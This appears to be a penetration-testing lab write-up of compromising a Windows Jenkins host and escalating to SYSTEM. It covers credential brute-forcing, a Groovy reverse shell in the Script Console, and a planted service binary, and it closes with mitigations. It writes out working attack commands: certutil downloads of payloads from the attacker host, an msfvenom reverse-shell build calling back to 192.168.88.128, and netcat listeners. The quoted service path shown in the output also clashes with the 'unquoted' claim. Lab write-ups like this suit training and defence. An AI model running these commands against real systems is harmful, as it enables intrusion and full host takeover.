# Jenkins Compromise & Windows Privilege Escalation via Unquoted Service Path

## Overview

This project demonstrates a **full compromise of a Windows host** through exposed **Jenkins administration functionality** followed by **local privilege escalation to SYSTEM** via an **unquoted service path vulnerability**.

The assessment began with service discovery and web application enumeration, followed by credential brute-forcing against the Jenkins login portal. After successfully authenticating, the **Jenkins Script Console** was abused to execute a **Groovy reverse shell**, providing remote command execution on the target. Privilege escalation was then achieved by identifying a vulnerable Windows service with **WinPEAS** and exploiting the unquoted service path using a malicious executable.

This lab demonstrates practical skills across:

- Network reconnaissance
- Web application attack surface analysis
- Credential brute-forcing
- Remote code execution through Jenkins
- Windows enumeration
- Local privilege escalation to SYSTEM

---

# Objectives

This project demonstrates the ability to:

- Perform **service discovery and enumeration**
- Identify and assess **exposed Jenkins services**
- Use **Burp Suite Intruder** to brute-force credentials
- Abuse the **Jenkins Script Console** for remote code execution
- Establish an interactive reverse shell
- Enumerate Windows privilege escalation paths
- Identify and exploit an **unquoted service path vulnerability**
- Obtain **SYSTEM-level access**

---

# Environment / Lab Setup

| Component | Details |
|----------|--------|
| Attacker Machine | Kali Linux |
| Target Machine | Windows Host running Jenkins |
| Target IP Address | `192.168.88.136` |
| Web Service | Jenkins on port `8080` |
| Proxy Tool | Burp Suite with FoxyProxy |
| Post-Exploitation Enumeration | WinPEASx64 |
| Payload Generation | msfvenom |

---

# Methodology

# 1. Network Reconnaissance

The engagement began with a full TCP port and service scan using Nmap.

### Command Used

```bash
nmap -T4 -p- -A 192.168.88.136
```

### Key Finding

Enumeration identified **port 8080** as open. Accessing the service in a browser revealed a **Jenkins login page**, indicating a potentially accessible CI/CD administration portal.

---

# 2. Jenkins Authentication Assessment

After identifying Jenkins, default credentials were tested and found to be unsuccessful.

To further assess authentication security:

- **FoxyProxy** was configured in Firefox
- Traffic was routed through **Burp Suite**
- A login request was captured and sent to **Intruder**

The request was then configured for a **cluster bomb attack** to test multiple username and password combinations.

---

# 3. Credential Brute-Force with Burp Intruder

Burp Intruder results showed one credential pair standing out from the rest based on:

- Significantly larger response size
- Absence of the expected `loginError` response

### Valid Credentials Identified

| Username | Password |
|----------|----------|
| `jenkins` | `jenkins` |

These credentials successfully authenticated to the Jenkins instance.

---

# 4. Remote Code Execution via Jenkins Script Console

Once authenticated, access to the **Jenkins Script Console** was available.

This feature allows execution of arbitrary **Groovy code** on the server and is highly dangerous when exposed to unauthorized users.

A Groovy reverse shell payload was used from the following reference:

```text
https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
```

Before executing the payload, the callback IP was modified to point to the attacker's Kali Linux machine.

---

# 5. Listener Setup

A Netcat listener was started on the attacker host to receive the reverse shell.

```bash
nc -nvlp 8044
```

After executing the Groovy reverse shell in the Jenkins Script Console, a connection was established.

### Initial Access Obtained As

```text
butler
```

This confirmed successful **remote code execution through Jenkins**.

---

# 6. Privilege Escalation Enumeration

To identify local privilege escalation opportunities, **WinPEASx64** was downloaded to the target.

### Tool Source

```text
https://github.com/peass-ng/PEASS-ng/releases/tag/20250701-bdcab634
```

On the attacker machine, the file was placed in a transfer directory and served over HTTP.

### Start HTTP Server on Kali

```bash
python3 -m http.server 80
```

---

# 7. Transfer WinPEAS to Target

From the shell on the compromised Windows machine, `certutil.exe` was used to download the binary.

```cmd
certutil.exe -urlcache -f http://192.168.88.128/winPEASx64.exe winpeas.exe
```

WinPEAS was then executed to enumerate privilege escalation vectors.

---

# 8. Identifying the Vulnerable Service

WinPEAS identified an interesting service entry:

```text
BootTime(2124)[C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe] -- POwn: SYSTEM
Permissions: Administrators [Allow: AllAccess]
Possible DLL Hijacking folder: C:\Program Files (x86)\Wise\Wise Care 365 (Administrators [Allow: AllAccess])
Command Line: "C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe"
```

### Key Observation

This service path is vulnerable due to an **unquoted service path weakness**.

Because the executable path contains spaces and is not properly quoted, Windows may attempt to execute a malicious binary placed earlier in the path resolution sequence.

---

# 9. Payload Generation

A malicious Windows reverse shell executable was generated with `msfvenom`.

### Command Used

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.88.128 LPORT=7777 -f exe > Wise.exe
```

This created a payload named:

```text
Wise.exe
```

---

# 10. Delivering the Malicious Executable

The attacker's HTTP server was restarted to host the generated payload.

```bash
python3 -m http.server 80
```

A Netcat listener was then started to receive the elevated shell.

```bash
nc -nvlp 7777
```

On the compromised Windows host, the payload was downloaded using `certutil`.

```cmd
certutil -urlcache -f http://192.168.88.128/Wise.exe Wise.exe
```

The payload was placed in the vulnerable path so that the service startup process would execute it with elevated privileges.

---

# 11. Triggering the Vulnerable Service

To force the service to execute the malicious binary, the service was stopped and restarted.

### Stop the Service

```cmd
sc stop WiseBootAssistant
```

### Start the Service

```cmd
sc start WiseBootAssistant
```

When the service restarted, it executed the malicious payload.

---

# 12. SYSTEM Access

The listener on port `7777` received a new reverse shell connection.

### Elevated Access Obtained As

```text
SYSTEM
```

This confirmed successful **privilege escalation from the `butler` user to NT AUTHORITY\SYSTEM**.

---

# Tools Used

| Tool | Purpose |
|-----|------|
| Nmap | Network scanning and service enumeration |
| Firefox + FoxyProxy | Browser proxy configuration |
| Burp Suite | Intercepting and brute-forcing web authentication |
| Jenkins Script Console | Remote code execution vector |
| Netcat | Reverse shell listener |
| WinPEASx64 | Windows privilege escalation enumeration |
| certutil.exe | File transfer to the target host |
| msfvenom | Malicious payload generation |

---

# Key Findings

| Vulnerability | Description | Severity |
|---------------|------------|----------|
| Weak Jenkins Credentials | Administrative portal protected by guessable credentials | Critical |
| Exposed Jenkins Script Console | Enables arbitrary code execution after authentication | Critical |
| Insecure Administrative Service Exposure | Jenkins accessible over the network | High |
| Unquoted Service Path | Allows privilege escalation via malicious executable placement | High |
| Excessive Write Permissions | Writable path contributed to exploitation feasibility | High |

---

# Attack Chain Summary

| Stage | Action |
|------|------|
| 1 | Performed Nmap scan against the target |
| 2 | Identified Jenkins running on port 8080 |
| 3 | Intercepted login request with Burp Suite |
| 4 | Used Intruder to brute-force credentials |
| 5 | Logged in with `jenkins:jenkins` |
| 6 | Accessed Jenkins Script Console |
| 7 | Executed Groovy reverse shell |
| 8 | Gained initial shell as `butler` |
| 9 | Downloaded and ran WinPEAS |
| 10 | Identified unquoted service path vulnerability |
| 11 | Generated malicious payload with msfvenom |
| 12 | Uploaded payload to the target |
| 13 | Restarted vulnerable service |
| 14 | Obtained SYSTEM shell |

---

# Exploitation Details

## Initial Access

The Jenkins administrative interface exposed a powerful post-authentication feature: the **Script Console**.  
Once valid credentials were discovered, it provided direct code execution on the target server through Groovy scripts.

## Privilege Escalation

Windows services configured with **unquoted executable paths** can become exploitable when:

- The path contains spaces
- A privileged service attempts to launch the executable
- An attacker can place a malicious binary in a location Windows checks first

In this case, the vulnerable service executed as **SYSTEM**, allowing the malicious executable to inherit that privilege level.

---

# Mitigation / Recommendations

## Enforce Strong Authentication

Administrative interfaces such as Jenkins should use:

- Strong, unique passwords
- Multi-factor authentication where possible
- Account lockout or rate limiting

---

## Restrict Access to Jenkins

Jenkins should not be broadly exposed to untrusted networks. Access should be limited using:

- Network ACLs
- VPN access
- Reverse proxy authentication controls

---

## Disable or Restrict Script Console Access

The **Script Console** should be tightly controlled because it provides direct code execution on the server.

---

## Review Windows Service Configurations

All service executable paths should be reviewed to ensure they are:

- Properly quoted
- Stored in protected directories
- Not writable by low-privileged users

---

## Reduce Local Privileges

Avoid granting unnecessary permissions to local users or groups in directories used by privileged services.

---

## Monitor for Suspicious Administrative Activity

Detect and alert on:

- Jenkins console usage
- Unexpected reverse shell behavior
- Service creation or restart anomalies
- Unauthorized binary placement in service paths

---

# Skills Demonstrated

This project demonstrates the following offensive security skills:

- Network reconnaissance
- Service identification and web enumeration
- Credential brute-forcing with Burp Suite Intruder
- Proxying browser traffic for web application testing
- Abuse of administrative application features for RCE
- Reverse shell deployment
- Windows post-exploitation enumeration
- Local privilege escalation analysis
- Exploitation of unquoted service path vulnerabilities

---

# Key Takeaways

This project demonstrates a complete **Windows host compromise** beginning with an exposed **Jenkins administrative service** and ending with **SYSTEM-level access**.

It highlights several critical security issues:

- Weak administrative credentials
- Overexposed management interfaces
- Dangerous code execution functionality in Jenkins
- Insecure Windows service configurations
- Insufficient hardening of privileged file paths

The exercise showcases practical offensive security techniques across **web application assessment, authenticated remote code execution, Windows enumeration, and privilege escalation**, making it highly relevant to **penetration testing and offensive security roles**.
